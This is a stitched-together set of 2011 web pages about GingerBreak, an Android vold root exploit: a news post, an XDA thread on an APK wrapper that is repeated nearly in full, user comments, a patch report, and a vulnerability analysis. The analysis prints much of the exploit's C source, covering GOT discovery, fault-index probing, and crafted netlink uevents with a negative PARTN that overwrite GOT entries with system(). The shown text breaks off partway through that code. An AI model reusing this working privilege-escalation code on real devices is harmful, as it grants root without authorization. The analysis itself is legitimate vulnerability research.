# GingerBreak (root for Gingerbread) app

By [Cory Gunther](https://androidcommunity.com/author/cory/) -   April 21, 2011 [9](https://androidcommunity.com/gingerbreak-root-for-gingerbread-app-20110421/#comments)

OK guys, this is fresh off the press and pretty new. Although the exploit has been extensively tested to be fully working, this app hasn‚Äôt yet. We got word about this being finally released (thanks @simms22) this morning and we just have to share it with everyone. This is an easy app for rooting Gingerbread, comes to us from no other than the [XDA Forums](http://forum.xda-developers.com/index.php). Check out below for more info.

I think I‚Äôll mention this now rather than later. As always use caution when doing any modifications, rooting, flashes or anything of that sort with your android phone. What you do is your own fault. So be careful and always read/learn before you try.

> This is an APK based on a slightly modified version of the GingerBreak source (released today by The Android Exploid Crew).

He goes on to mention that it was able to root his stock Galaxy S JVB 2.3.3 with no problem, so that sounds good. The developer of this app over at xda named **Chainfire** also mentioned that it will run the exploit, remount /system read/write, install su binaries and SuperUser.apk all for you. This is still very new and a basic release, there is not any instructions other than a little ‚Äúif it doesn‚Äôt work, try this‚Äù so far. So this is for the serious, the bold, and the daring. Or those that drink Dos Equis.

I‚Äôll head you right over to the action, you can get the APK and read what the others have been doing all over at xda, this is a basic system for rooting gingerbread and the Android Exploid Crew mention on their blog that it very well may work for FroYo and Honeycomb also, but that is not for sure so you probably should wait before trying that.

    I was searching a lot about rooting gingerbread. Best and most simple program for rooting is SuperOneClick but unfortunetly it just dont work for gingerbread. Even if new version have gingerbreak option. What i know only option to root gingerbread is ‚Äúupdate‚Äù system do older version 2.2.2 than root and than update again to 2.3.3. Im too noob to made it on my own or i will mess up my phone. Sry for crappy english üòÄ

**NOTICE: Gingerbreak is an exploit that has been fixed in many of the latest Android versions and releases. If it does not work, it does not work. I can't "fix" the exploit, you will have to wait for a new exploit to come out, or root a different way!**

**About**

The GingerBreak APK is a wrapper around the newly released GingerBreak exploit (credits to The Android Exploid Crew), which is meant to attain root access on GingerBread. This specific exploit **may** work on various Froyo and Honeycomb versions as well.

What the APK and exploit do is as follows:

- The APK puts the right files in the right place to run the exploit

- The APK runs the exploit

- The exploit attempts to attain root access

- If it succeeds, the exploit remounts /system as read-write and runs the installer script

- The installer script attempts to install the su binary and superuser APK, and reboots

Some important things to know:

- You must have USB debugging enabled on your device

- You need to have an SD card (formatted and) inserted - if it doesn't work, try formatting the SD card in your computer, or switching it with a different (or old, etc) SD card

- The APK must be installed to device, NOT SD card

- The exploit may take a while to run, but not more than 10 minutes, if it does, get me a logcat, and reboot the device. In rare occasions, even if the device does not reboot, you may still have root. So check that out after you manually pull battery after 15 minutes or so of being stuck.

- Always reboot between root attempts!

- While (temporary?) root access may be attained, due to locked bootloaders, efuses, S-ON, and whatnot this may still not work on your device. For temproot purposes, use the raw binary exploit (linked below), not this APK.

- The GingerBreak exploit should not be used to attain temproot and continue using the device. It fscks vold, you do not want to be running like that. You want to reboot! So if the root doesn't stick, you (still) have a problem.

**Installation**

- Optional: Press the Thanks button below this post ![:)](data:image/gif;base64... "Smile    :)")

- Make sure USB debugging is enabled

- Make sure you have an SD card (formatted and) inserted

- Get the APK on the phone somehow, and install it

- Open the APK, press the root button

- Wait a few minutes. If there are no problems, the device will reboot (note that the reboot itself can take like 10 minutes due to cache wipe)

- Make sure the Superuser app is install and working

- Optional: Install BusyBox from Market (I personally prefer the stericsson installer)

- Optional: Uninstall GingerBreak, you don't need it on your phone anymore

- Optional: Make a donation ![;)](data:image/gif;base64... "Wink    ;)")

**WARNING: Apparently on some devices the root exploit causes the SD card (internal or external) to be formatted. Also, if it gets stuck but you do see the card mounting/unmounting, try formatting your SD card yourself and try again (or use a different SD card) - often this works** (a fix for both issues is being looked at)

**NO IT DOES NOT WORK ON THE GALAXY ACE** (yet ?)

**WORKS ON A RARE SGS2, BUT NOT ON MOST** (seems to be only pre-release devices that are rootable this way)

**ACER A500 / ICONIA** Look [here (click)](http://xdaforums.com/showpost.php?p=13292713&postcount=82). Will eventually be integrated, I guess ![:)](data:image/gif;base64... "Smile    :)")

**Report!**

Please report back if it does or doesn't work on specific devices. If it doesn't, don't forget to post your logcat as attachment, and mention your device details and GingerBreak version.

**Credits**

- I made the APK and did some slight modding to the exploit code to install from an APK

- The exploit ("GingerBreak") itself is made by The Android Exploid Crew. Original code can be found here: <http://c-skills.blogspot.com/2011/04/yummy-yummy-gingerbreak.html>

**Manual rooting**

From v1.1 it is no longer possible to manually root the device over an ADB connection using the files from this APK. Please use the original binaries from the c-skills website to do this. There are several guides posted here on XDA about how to do this manually, some are mentioned/linked-to in the first few pages of this thread.

**Note**

GingerBreak is not specific to any device, but there is code in there that may not work on device X or Y. The exploit is generic, but that does not mean one size fits all, nor does it mean that there will be no firmwares out there that fix this exploit. A special version may need to be compiled for your device, ask your favorite hacker from your specific device's forum. This APK is meant to make the process easier, but also adds dependancies so that it may not work on your device.

**AGAIN, THIS DOES NOT WORK ON S-ON DEVICES !**

**Changelog**

26.04.2011: v1.2

- Removed some code that may break operation while the code itself isn't needed

- Added UnRoot option

- The APK now logs exploit output semi-live

22.04.2011: v1.1

- Modded exploit code to not need /data/local/tmp - this should fix the problem extracting assets as well as be more compatible with various devices (in theory). In case the APK notices that this cannot work, it will warn you about this.

- Added some warnings and errors to the APK

21.04.2011: v1.0

- First release of APK

- Slight mods to the exploit source to have it work better from APK

Congrats to C-Skills to for the exploit of course.

PS: if you want it to work on Galaxy S II: extract in /app-cache instead of /data/local/tmp

It's for a Nexus One (tested), so if you want to use the step-by-step for a different device, you will have to change the partitions in the mounting commands.

For people getting "could not extract assets" error execute

adb shell rmdir /data/local/tmp

and then

adb shell mkdir /data/local/tmp

  [![Chainfire](/data/avatars/s/631/631273.jpg?1600603004)](/m/chainfire.631273/)

  **[Chainfire](/m/chainfire.631273/)**

  **NOTICE: Gingerbreak is an exploit that has been fixed in many of the latest Android versions and releases. If it does not work, it does not work. I can't "fix" the exploit, you will have to wait for a new exploit to come out, or root a different way!**

  **About**

  The GingerBreak APK is a wrapper around the newly released GingerBreak exploit (credits to The Android Exploid Crew), which is meant to attain root access on GingerBread. This specific exploit **may** work on various Froyo and Honeycomb versions as well.

  What the APK and exploit do is as follows:

  - The APK puts the right files in the right place to run the exploit

  - The APK runs the exploit

  - The exploit attempts to attain root access

  - If it succeeds, the exploit remounts /system as read-write and runs the installer script

  - The installer script attempts to install the su binary and superuser APK, and reboots

  Some important things to know:

  - You must have USB debugging enabled on your device

  - You need to have an SD card (formatted and) inserted - if it doesn't work, try formatting the SD card in your computer, or switching it with a different (or old, etc) SD card

  - The APK must be installed to device, NOT SD card

  - The exploit may take a while to run, but not more than 10 minutes, if it does, get me a logcat, and reboot the device. In rare occasions, even if the device does not reboot, you may still have root. So check that out after you manually pull battery after 15 minutes or so of being stuck.

  - Always reboot between root attempts!

  - While (temporary?) root access may be attained, due to locked bootloaders, efuses, S-ON, and whatnot this may still not work on your device. For temproot purposes, use the raw binary exploit (linked below), not this APK.

  - The GingerBreak exploit should not be used to attain temproot and continue using the device. It fscks vold, you do not want to be running like that. You want to reboot! So if the root doesn't stick, you (still) have a problem.

  **Installation**

  - Optional: Press the Thanks button below this post ![:)](data:image/gif;base64... "Smile    :)")

  - Make sure USB debugging is enabled

  - Make sure you have an SD card (formatted and) inserted

  - Get the APK on the phone somehow, and install it

  - Open the APK, press the root button

  - Wait a few minutes. If there are no problems, the device will reboot (note that the reboot itself can take like 10 minutes due to cache wipe)

  - Make sure the Superuser app is install and working

  - Optional: Install BusyBox from Market (I personally prefer the stericsson installer)

  - Optional: Uninstall GingerBreak, you don't need it on your phone anymore

  - Optional: Make a donation ![;)](data:image/gif;base64... "Wink    ;)")

  **WARNING: Apparently on some devices the root exploit causes the SD card (internal or external) to be formatted. Also, if it gets stuck but you do see the card mounting/unmounting, try formatting your SD card yourself and try again (or use a different SD card) - often this works** (a fix for both issues is being looked at)

  **NO IT DOES NOT WORK ON THE GALAXY ACE** (yet ?)

  **WORKS ON A RARE SGS2, BUT NOT ON MOST** (seems to be only pre-release devices that are rootable this way)

  **ACER A500 / ICONIA** Look [here (click)](http://xdaforums.com/showpost.php?p=13292713&postcount=82). Will eventually be integrated, I guess ![:)](data:image/gif;base64... "Smile    :)")

  **Donate**

  Donate to Chainfire by PayPal: [click this link](http://www.jongma.org/dx.php)

  Donate to The Android Exploid Crew by PayPal: 7-4-3-C@web.de

  **Report!**

  Please report back if it does or doesn't work on specific devices. If it doesn't, don't forget to post your logcat as attachment, and mention your device details and GingerBreak version.

  **Credits**

  - I made the APK and did some slight modding to the exploit code to install from an APK

  - The exploit ("GingerBreak") itself is made by The Android Exploid Crew. Original code can be found here: <http://c-skills.blogspot.com/2011/04/yummy-yummy-gingerbreak.html>

  **Manual rooting**

  From v1.1 it is no longer possible to manually root the device over an ADB connection using the files from this APK. Please use the original binaries from the c-skills website to do this. There are several guides posted here on XDA about how to do this manually, some are mentioned/linked-to in the first few pages of this thread.

  **Note**

  GingerBreak is not specific to any device, but there is code in there that may not work on device X or Y. The exploit is generic, but that does not mean one size fits all, nor does it mean that there will be no firmwares out there that fix this exploit. A special version may need to be compiled for your device, ask your favorite hacker from your specific device's forum. This APK is meant to make the process easier, but also adds dependancies so that it may not work on your device.

  **AGAIN, THIS DOES NOT WORK ON S-ON DEVICES !**

  **Changelog**

  26.04.2011: v1.2

  - Removed some code that may break operation while the code itself isn't needed

  - Added UnRoot option

  - The APK now logs exploit output semi-live

  22.04.2011: v1.1

  - Modded exploit code to not need /data/local/tmp - this should fix the problem extracting assets as well as be more compatible with various devices (in theory). In case the APK notices that this cannot work, it will warn you about this.

  - Added some warnings and errors to the APK

  21.04.2011: v1.0

  - First release of APK

  - Slight mods to the exploit source to have it work better from APK

  **Sources**

  Attached archive contains the modified sources for the exploit part of this APK. I will publish new versions only when it changes; the APK may be updated to a newer version, this does not necessarily mean the exploit has changed ![:)](data:image/gif;base64... "Smile    :)")

  Also, apologies for the few days delay in posting the source.

  If it does not work, are there any alternatives.

[If you want to support smartphone hacking, [check this.](http://c-skills.blogspot.de/2012/05/android-phones-wanted.html)]

Free your phone, once again. Successfully tested on *Gingerbread*

(2.3.3) but might also run on *Froyo* and *Honeycomb*. If it fails

there, some offsets and indexes need to be adjusted which is

left to the reader.

NOTE: You use it at your own risk! I am not responsible for any

failure or damage. Make sure to read the README file carefully!

Download it [here](http://stealth.openwall.net/xSports/GingerBreak.tgz).

If you successfully run it anywhere, please make a comment

with exact device model/firmware running.

[This software is >1 year old meanwhile, most vendors fixed

the bug already. So its unlikely to run on new devices.]

**[Update]** I replaced the tarball with a new version to fix

some glitches while parsing **vold.fstab**. Should now also

work on the GalaxyS. Thx to *Chainfire*.

Works on Wildfire/2.2.1 (Froyo). However, it doesn't always work on the first attempt and it helps if you keep the phone busy (e.g. permanent touch-screen inputs) while doing it.

Unfortunately no R/W access to /system is available (-> yaffs error messages), would be nice to have this permanently.

Hi! It seems the new Samsung Galaxy S has a new vold with a relative fresh patch:

Hi,
The HTC Incredible S ROM 2.3.3 can not use GingerBreak to get root, it blocked when running this, and I found out the pid of vold does not present in /proc/net/netlink, any workaround?
Thanks.

Thanks for the great code the dev team is offering ! Unfortunately, this did not work for me :( .

For those for who the Gingerbreak does not work (as me, on Galaxy S i9000), here is another method to root your phone : [Root any Android version with Odin without losing any data](http://trollfactory.fr/comment-rooter-son-android-quelque-soit-la-version-avec-odin-root-your-android-phone-any-version-using-odin-473#post)

It is not more complicated than the Gingerbreak to use, and it works everytime.

Hope it will help.

Hi. I'm also having problems with gingerbreak. stays on the screen that says its rooting forever, doesnt reboot or anything just stays in the rooting screen. I'm trying this on the galaxy s2 using the 1.20 gingerbreak with usb debugging enabled. please, any help here would be fantastic! Should also point out I'm not using a pc but rather downloading to and attempting root from the phone. cheers in advance.

New Vizio Tablet Rooted Well Before Launch > It's a lie. GingerBreak does not work on Vizio Tablet. In fact there is no one out there with a Rooted vizio Tablet . The pictures one see On the web are of the same one. Doctored screen or maybe rooted pre-order version. But I can only tell you has something to do with how the SD card mounts.

Are you able to compile the gingerbreak-binary for x86-platform?

This would be very useful for different Tablet's and for GoogleTV.

Hi I have LG Swift Me p350. Many people use these smartphones and used Your software to make root rights. But after upgrade software to Android 2.2.2 2.6.32.9 it doesn't work. I tried find resolution for this problem but I found only the same problem like main in Polish forums and English. I hope that U will think about this case in next version Your software. I can only say that other programs didn't work too.

Thanks for good job.

Doesn't work on Gionee Pioneer P1, Android 2.3.6.

It just keeps exploiting for the whole time and when I rebooted my device (I made it exploit for 15 minutes just to make sure), There are no signs that my device was rooted (No supersu) I tried using rootchecker and it tells me my device isn't rooted.

Pleaseee I want my device rooted... so bad

# Google Patches GingerBreak Exploit, But Don't Worry - We Still Have Root (For Now)

Well, that was fast. It hasn't been very long since the *[vold exploit](http://c-skills.blogspot.com/2011/04/yummy-yummy-gingerbreak.html)* was found that allowed root access to Gingerbread and Honeycomb systems, but Google has already patched it and moved the fix into the AOSP code (see these commits: [[1]](http://android.git.kernel.org/?p=platform/system/core.git;a=commit;h=b620a0b1c7ae486e979826200e8e441605b0a5d6), [[2]](http://android.git.kernel.org/?p=platform/system/vold.git;a=commit;h=c51920c82463b240e2be0430849837d6fdc5352e), [[3]](http://android.git.kernel.org/?p=platform/system/netd.git;a=commit;h=79b579c92afc08ab12c0a5788d61f2dd2934836f), [[4]](https://review.source.android.com/#change,22646)). This means that once this update is pushed, we will need to find another route to achieve root access on devices running Gingerbread and Honeycomb.

Don't let this stop you from buying a new device right now, though, because it's far from certain when this fix will actually end up hitting devices. And while there may not be another known method around yet, we're sure some enterprising hackers somewhere are already hard at work.

## Android vold mPartMinors[] Signedness¬†Issue

[with 6 comments](https://xorl.wordpress.com/2011/04/28/android-vold-mpartminors-signedness-issue/#comments)

Earlier this day this ‚Äúutility‚Äù was released by Sebastian Krahmer (aka [stealth](http://c-skills.blogspot.com/)). You can find his published blog post and exploit code [here](http://c-skills.blogspot.com/2011/04/yummy-yummy-gingerbreak.html). With this post I‚Äôm opening a new category which is obviously‚Ä¶ ‚Äú[Android](https://xorl.wordpress.com/category/android/)‚Äù since it has become almost a mainstream platform for exploit developers.

![](https://xorl.wordpress.com/wp-content/uploads/2011/04/gingerbreak.jpg?w=700 "gingerbreak")

So, this time the vulnerability was part of the ‚Äúvold‚Äù volume manager daemon. We can find the definition of the ‚ÄòmPartMinors[]‚Äô array in DirectVolume.h header file as shown below.

```

typedef android::List<char *> PathCollection;

class DirectVolume : public Volume {
public:
    static const int MAX_PARTITIONS = 4;
protected:
    PathCollection *mPaths;
    int            mDiskMajor;
    int            mDiskMinor;
    int            mPartMinors[MAX_PARTITIONS];
    int            mDiskNumParts;
    int            mPendingPartsCount;
  ...
};

```

Now a look at DirectVolume.cpp shows how the initialization of this array is performed.

```

DirectVolume::DirectVolume(VolumeManager *vm, const char *label,
                           const char *mount_point, int partIdx) :
              Volume(vm, label, mount_point) {
    mPartIdx = partIdx;

    mPaths = new PathCollection();
    for (int i = 0; i < MAX_PARTITIONS; i++)
        mPartMinors[i] = -1;
  ...
    setState(Volume::State_NoMedia);
}

```

This file also contains the exploited vulnerability located in the following C++ method.

```

void DirectVolume::handlePartitionAdded(const char *devpath, NetlinkEvent *evt) {
    int major = atoi(evt->findParam("MAJOR"));
    int minor = atoi(evt->findParam("MINOR"));

    int part_num;

    const char *tmp = evt->findParam("PARTN");

    if (tmp) {
        part_num = atoi(tmp);
    } else {
        SLOGW("Kernel block uevent missing 'PARTN'");
        part_num = 1;
    }

    if (part_num > mDiskNumParts) {
        mDiskNumParts = part_num;
    }
  ...
    if (part_num > MAX_PARTITIONS) {
        SLOGE("Dv:partAdd: ignoring part_num = %d (max: %d)\n", part_num, MAX_PARTITIONS);
    } else {
        mPartMinors[part_num -1] = minor;
    }
    --mPendingPartsCount;
  ...
}

```

As you can see, the signed integer ‚Äòpart\_num‚Äô is derived from the user controlled ‚Äòevt->findParam(‚ÄúPARTN‚Äù)‚Äô value. Also, as stealth noticed this is only checked against the maximum allowed values. However, since this is a signed integer by providing a negative value the attacker is able to bypass the checks and perform an arbitrary memory write operation controlling both the offset (via the ‚Äòpart\_num‚Äô index) and the value that will be written (via the ‚Äòminor‚Äô parameter).

Now to the interesting part, [the exploit](http://stealth.openwall.net/xSports/GingerBreak.tgz) (aka GingerBreak)‚Ä¶

First of all, since I think it is appropriate, here is the comment section of the exploit (GingerBreak.c).

```

/* android 2.2-3.0 vold root exploit "mPartMinors[] (NPARTS) out of bounds write"
 * (checked for upper limit but not against negative values).
 *
 * Exploited by changing GOT entry of strcmp(),atoi() etc. to system()
 * and then triggering such call with provided pointer. :D

 * I AM NOT RESPONSIBLE FOR ANY DAMAGE IT MIGHT CAUSE!
 *
 * It only works if called from adb shell since we need
 * group log.
 *
 */

```

With that being said, we can start the analysis from the main() function of the exploit code.

```

int main(int argc, char **argv, char **env)
{
	uint32_t i = 0, j = 0, idx = 0;
	char *ash[] = {sh, 0};
	struct stat st;
	char build_id[256], version_release[256];

	if (geteuid() == 0 && getuid() == 0 && strstr(argv[0], "boomsh"))
		do_root();

	printf("\n[**] Gingerbreak/Honeybomb -- android 2.[2,3], 3.0 softbreak\n");
	printf("[**] (C) 2010-2011 The Android Exploid Crew. All rights reserved.\n");
	printf("[**] Kudos to jenzi, the #brownpants-party, the Open Source folks,\n");
	printf("[**] Zynamics for ARM skills and Onkel Budi\n\n");
	printf("[**] donate to 7-4-3-C@web.de if you like\n[**] Exploit may take a while!\n\n");

```

So, if this is executed by root and its filename is ‚Äòboomsh‚Äô it will invoke do\_root(). You will understand why this is happening later by reading his code. As you might have guessed, do\_root() is nothing really fancy, just this.

```

static char *sh = "/data/local/tmp/sh";
  ...
static void do_root()
{
	remount_data("/data");
	chown(sh, 0, 0);
	chmod(sh, 04711);
	exit(0);
}

```

Before changing the owner/group and permissions of the ‚Äòsh‚Äô shell, it invokes another routine named remount\_data().

```

static int remount_data(const char *mntpoint)
{
	FILE *f = NULL;
	int found = 0;
	char buf[1024], *dev = NULL, *fstype = NULL;

	if ((f = fopen("/proc/mounts", "r")) == NULL)
		return -1;

	memset(buf, 0, sizeof(buf));
	for (;!feof(f);) {
		if (fgets(buf, sizeof(buf), f) == NULL)
			break;
		if (strstr(buf, mntpoint)) {
			found = 1;
			break;
		}
	}
	fclose(f);
	if (!found)
		return -1;
	if ((dev = strtok(buf, " \t")) == NULL)
		return -1;
	if (strtok(NULL, " \t") == NULL)
		return -1;
	if ((fstype = strtok(NULL, " \t")) == NULL)
		return -1;
	return mount(dev, mntpoint, fstype, MS_REMOUNT, 0);
}

```

After parsing the ‚Äò/proc/mounts‚Äô to discover the requested mount point, it uses mount(2) system call to re-mount the aforementioned mount point.

Now back to main() we continue the execution with some envinroment information gathering.

```

static char *sh = "/data/local/tmp/sh";
static char *bsh = "/data/local/tmp/boomsh";
   ...
	if (copy("/proc/self/exe", bsh) < 0 || copy("/system/bin/sh", sh) < 0)
		die("[-] Cannot copy boomsh.");

	chmod(bsh, 0711);

	__system_property_get("ro.build.id", build_id);
	__system_property_get("ro.build.version.release", version_release);

	if (strstr(build_id, "HONEY") || strstr(build_id, "Honey") || strstr(build_id, "honey") ||
	    strstr(version_release, "comb")) {
		printf("[+] Detected honeycomb! Starting honeybomb mode (scale=10).\n");
		scale = 10;
		honeycomb = 1;
	} else if (strstr(build_id, "FR") || strstr(build_id, "Fr") || strstr(build_id, "fr")) {
		printf("[+] Detected Froyo!\n");
		froyo = 1;
	} else
		printf("[+] Plain Gingerbread mode!\n");

```

It copies the current executable to ‚Äò/data/local/tmp/boomsh‚Äô and system‚Äôs shell binary to ‚Äò/data/local/tmp/sh‚Äô. It updates the boomsh‚Äôs permissions and then uses \_\_system\_property\_get() to obtain the operating system‚Äôs information. Then depending on its release it updates some values that will be later used in the exploit in order to be operational in all ‚ÄúHoneycomb‚Äù, ‚ÄúFroyo‚Äù and other versions.

The copy() routine you see above is nothing more than a simple copying routine.

```

static int copy(const char *from, const char *to)
{
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0)
		return -1;
	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));
		if (r <= 0)
			break;
		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);
	sync(); sync();
	return r;
}

```

Continuing the information gathering stage, the main() routine will call the following functions‚Ä¶

```

static struct {
	pid_t pid;
	uint32_t got_start, got_end;
	uint32_t system;
	char *device;
	char found;
} vold;
   ...
	find_vold(&vold);
	find_got("/system/bin/vold");
	find_device();

	printf("[*] vold: %04d GOT start: 0x%08x GOT end: 0x%08x\n", vold.pid, vold.got_start,
	       vold.got_end);

```

So, we have three new routines and a printf(3) call that provides information about the .GOT section. The first one, find\_vold() is shown here.

```

static void find_vold()
{
	char buf[2048], *ptr = NULL;
	int i = 0, fd;
	pid_t found = 0;
	FILE *f = NULL;

	vold.found = 0;

	if ((f = fopen("/proc/net/netlink", "r")) == NULL)
		die("[-] fopen");

	for (;!feof(f);) {
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if ((ptr = strtok(buf, "\t ")) == NULL)
			break;
		if ((ptr = strtok(NULL, "\t ")) == NULL)
			break;
		if ((ptr = strtok(NULL, "\t ")) == NULL)
			break;
		if (!*ptr)
			break;
		i = atoi(ptr);
		if (i <= 1)
			continue;
		sprintf(buf, "/proc/%d/cmdline", i);
		if ((fd = open(buf, O_RDONLY)) < 0)
			continue;
		memset(buf, 0, sizeof(buf));
		read(fd, buf, sizeof(buf) - 1);
		close(fd);
		if (strstr(buf, "/system/bin/vold")) {
			found = i;
			break;
		}
        }
	fclose(f);
	if (!found)
		return;

	vold.pid = found;
	vold.found = 1;

	/* If already called no need to look for the mappings again as
	 * they wont change
	 */
	if (vold.system)
		return;

	ptr = find_symbol("system");
	vold.system = (uint32_t)ptr;
	printf("[+] Found system: %p strcmp: %p\n", ptr, find_symbol("strcmp"));
        return;
}

```

It opens the ‚Äò/proc/net/netlink‚Äô and scans it in order to find ‚Äò/system/bin/vold‚Äô. Finally, it invokes find\_symbol() to locate the system(3) and strcmp(3) symbols‚Äô addresses. Moving to find\_symbol() we have the following‚Ä¶

```

static void *find_symbol(char *sym)
{
	void *r = NULL;
	void *dlh = dlopen("/system/libc/libc.so", RTLD_NOW);

	if (!dlh)
		die("[-] dlopen");
	if ((r = (void *)dlsym(dlh, sym)) == NULL)
		die("[-] dlsym");
	dlclose(dlh);
	return r;
}

```

So, it uses ‚Äò/system/libc/libc.so‚Äô (the system‚Äôs C library) to discover the requested symbol. Back to main() we had a call to find\_got() passing the binary‚Äôs full path. Here is this function.

```

static void find_got(char *file)
{
	int fd, i;
	Elf32_Ehdr ehdr;
	Elf32_Phdr phdr;
	Elf32_Dyn *dyn = NULL;
	size_t dyn_size = 0;

	memset(&ehdr, 0, sizeof(ehdr));
	memset(&phdr, 0, sizeof(phdr));

	if ((fd = open(file, O_RDONLY)) < 0)
		die("[-] open");

	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr))
		die("[-] read");
	if (lseek(fd, ehdr.e_phoff, SEEK_SET) != ehdr.e_phoff)
		die("[-] lseek");

	for (i = 0; i < ehdr.e_phnum; ++i) {
		if (read(fd, &phdr, sizeof(phdr)) != sizeof(phdr))
			die("[-] read");
		if (phdr.p_type == PT_DYNAMIC)
			break;
	}
	if (phdr.p_type != PT_DYNAMIC)
		die("[-] No GOT found!");
	if (lseek(fd, phdr.p_offset, SEEK_SET) != phdr.p_offset)
		die("[-] lseek");
	dyn_size = phdr.p_filesz;
	printf("[+] Found PT_DYNAMIC of size %d (%d entries)\n", dyn_size,
	       dyn_size/sizeof(Elf32_Dyn));
	if ((dyn = malloc(dyn_size)) == NULL)
		die("[-] malloc");
	if (read(fd, dyn, dyn_size) != dyn_size)
		die("[-] read");
	close(fd);
	for (i = 0; i < dyn_size/sizeof(Elf32_Dyn); ++i) {
		if (dyn[i].d_tag == DT_PLTGOT)
			break;
	}
	if (dyn[i].d_tag != DT_PLTGOT)
		die("[-] No GOT found!");

	vold.got_start = dyn[i].d_un.d_ptr;
	free(dyn);

	/* Not really the end, but who cares, 64 entries should be enough
	 */
	vold.got_end = vold.got_start + scale*64;
	printf("[+] Found GOT: 0x%08x\n", vold.got_start);
}

```

This routine uses the ELF-32 API to open the requested file and parse its ELF header. It looks for ‚ÄòDT\_PLTGOT‚Äô to locate the .GOT section and it assumes that it does not exceed the 64 entries which are either way enough for the exploit to work reliably. The scale argument is a version specific value which was calculated earlier.

At last, main() calls find\_device() which is shown below.

```

static char *default_dev = "/devices/platform/msm_sdcc.2/mmc_host/mmc1";
   ...
static void find_device()
{
	char buf[1024], *dev = NULL, *sp = NULL;
	FILE *f;

	if ((f = fopen("/etc/vold.fstab", "r")) == NULL) {
		if ((f = fopen("/system/etc/vold.fstab", "r")) == NULL) {
			printf("[-] No vold.fstab found. Using default.\n");
			vold.device = strdup(default_dev);
			return;
		}
	}

	for (;!feof(f);) {
		memset(buf, 0, sizeof(buf));
		if (!fgets(buf, sizeof(buf), f))
			break;
		if (buf[0] == '#')
			continue;
		if (strstr(buf, "dev_mount") && (dev = strstr(buf, "/devices/")))
			break;
	}
	fclose(f);

	if (!dev) {
		printf("[-] No device found. Using default.\n");
		vold.device = strdup(default_dev);
	} else {
		if ((sp = strchr(dev, ' '))) {
			*sp = 0;
			vold.device = strdup(dev);
		} else if ((sp = strchr(dev, '\n'))) {
			*sp = 0;
			vold.device = strdup(dev);
		} else {
			printf("[-] No device found. Using default.\n");
			vold.device = strdup(default_dev);
		}
	}
	printf("[+] Using device %s\n", vold.device);
}

```

This will use either ‚Äò/etc/vold.fstab‚Äô or ‚Äò/system/etc/vold.fstab‚Äô to discover the device. Moving to main() once again, we have‚Ä¶

```

static pid_t logcat_pid = 77;
  ...
static char *crashlog = "/data/local/tmp/crashlog";
  ...
	idx = find_index();

	kill(logcat_pid, SIGKILL);
	unlink(crashlog);

```

The most important step here is the call to find\_index() that will calculate the correct index value for the ‚ÄòmPartMinors[]‚Äô array. Then it will attempt to kill the [logcat](http://developer.android.com/guide/developing/tools/logcat.html) and remove the crash log which makes more sense after reading find\_index() you see here.

```

static uint32_t find_index()
{
	uint32_t min = 0, max = vold.got_start, fault_addr = 0, idx = 0;
	char buf[1024], *ptr = NULL;
	FILE *f = NULL;
	long pos = 0;

	system("/system/bin/logcat -c");
	unlink(crashlog);

	if ((logcat_pid = fork()) == 0) {
		char *a[] = {"/system/bin/logcat",  "-f", crashlog, NULL};
		execve(*a, a, environ);
		exit(1);
	}

	sleep(3);

	idx = scale*0x1000/4;
	for (;;) {
		if (do_fault(idx, 1) < 0)
			continue;
		/* Give logcat time to write to file
		 */
		sleep(3);
		if ((f = fopen(crashlog, "r")) == NULL)
			die("[-] Unable to open crashlog file");
		fseek(f, pos, SEEK_SET);
		do {
			memset(buf, 0, sizeof(buf));
			if (!fgets(buf, sizeof(buf), f))
				break;
			if ((ptr = strstr(buf, "fault addr ")) != NULL) {
				ptr += 11;
				fault_addr = (uint32_t)strtoul(ptr, NULL, 16);
				printf("[*] vold: %04d idx: %d fault addr: 0x%08x\n", vold.pid, -idx, fault_addr);
			}
		} while (!feof(f));
		pos = ftell(f);
		fclose(f);

		if (fault_addr > min && fault_addr < max) {
			printf("[+] fault address in range (0x%08x,idx=%d)\n", fault_addr, -idx);
			break;
		}
		idx += 0x1000/4;
	}

	// Honeycomb needs scaling by 10
	idx = (fault_addr + 4*idx - vold.got_start)/4;
	if (scale > 1)
		idx = scale*(fault_addr + 4*idx/scale - vold.got_start)/4;

	printf("[+] Calculated idx: %d\n", -idx);
	return idx;
}

```

As you can see, find\_index() will clear the logcat logs via the system(3) call and remove the ‚Äò/data/local/tmp/crashlog‚Äô log. Then, it will restart it using ‚Äò/data/local/tmp/crashlog‚Äô as its log file. Next, after calculating the index value to be used, it will enter a loop checking for failed exploitation attempts by scanning the error log file for the ‚Äòfault addr ‚Äò string. If this is the case, it will retrieve the addresses that caused the fault and perform the final index calculation based on these values.

During each iteration, do\_fault() is called passing the index. Here is this function‚Ä¶

```

static int do_fault(uint32_t idx, int oneshot)
{
	char buf[0x1000];
	struct sockaddr_nl snl;
	struct iovec iov = {buf, sizeof(buf)};
	struct msghdr msg = {&snl, sizeof(snl), &iov, 1, NULL, 0, 0};
	int sock = -1, n = 0;

	do {
		find_vold();
		usleep(10000);
	} while (!vold.found);

	usleep(200000);
	memset(buf, 0, sizeof(buf));
	memset(&snl, 0, sizeof(snl));
	snl.nl_family = AF_NETLINK;

	if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) < 0)
		die("[-] socket");
	snl.nl_pid = vold.pid;

	memset(buf, 0, sizeof(buf));
	n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
	                  "DEVPATH=%s%c"
                          "MAJOR=179%cMINOR=%d%cDEVTYPE=harder%cPARTN=%d",
                          0, 0, 0, vold.device, 0, 0, vold.system, 0, 0, -idx);
	msg.msg_iov->iov_len = n;

	n = sendmsg(sock, &msg, 0);
	if (n < 0 || oneshot) {
		close(sock);
		return n;
	}

	usleep(500000);

	/* Trigger any of the GOT overwriten strcmp(), atoi(), strdup() etc.
	 * inside vold main binary.
	 * Arent we smart? Using old school technique from '99 to fsck NX while others
	 * re-invent "ROP". Wuhahahahaha!!!
	 */
	if (honeycomb) {
		n = snprintf(buf, sizeof(buf), "@/foo%cACTION=add%cSUBSYSTEM=block%c"
		                  "SEQNUM=%s%cDEVPATH=%s%c"
